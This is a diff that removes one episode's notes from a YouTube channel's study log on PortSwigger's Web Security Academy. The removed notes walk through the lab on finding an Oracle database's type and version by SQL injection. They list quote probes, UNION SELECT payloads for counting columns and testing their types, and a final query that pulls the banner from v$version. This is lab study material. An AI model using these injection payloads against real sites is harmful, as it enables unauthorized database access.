@@ -151,36 +151,7 @@ Episode7- YouTube Channel AcronProject:
 -------------------------------------------------------------------------------------------------------------------------------------
 
 
-Episode8- YouTube Channel AcronProject:
-    Title:
-        Lab: SQL injection attack, querying the database type and version on Oracle
-    Source:
-        https://portswigger.net/web-security/sql-injection/examining-the-database
 
-    Lab:
-        https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle
-
-    Detection Black Box :    @@version  OR v$version OR version() 
-        1- '
-        2- ''
-            Result: 1 != 2 ---> SQLi probably
-
-        3- '+UNION+SELECT+NULL+FROM+v$version--      
-        4- '+UNION+SELECT+NULL,+NULL+FROM+v$version--
-            Result: 3 != 4 ---> Two columns probably              
-                                and
-                                is Oracle Because --> SELECT * FROM v$version 
-                                                                    ---------
-                            
-        5- '+UNION+SELECT+'string',+NULL+FROM+v$version--
-            Result: Show in browser => first column is string
-
-        6- '+UNION+SELECT+'string',+'string2'+FROM+v$version--
-            Result: Show in browser => secend column is string
-        
-        7- '+UNION+SELECT+banner,+NULL+FROM+v$version--
-
-        
 
 
 
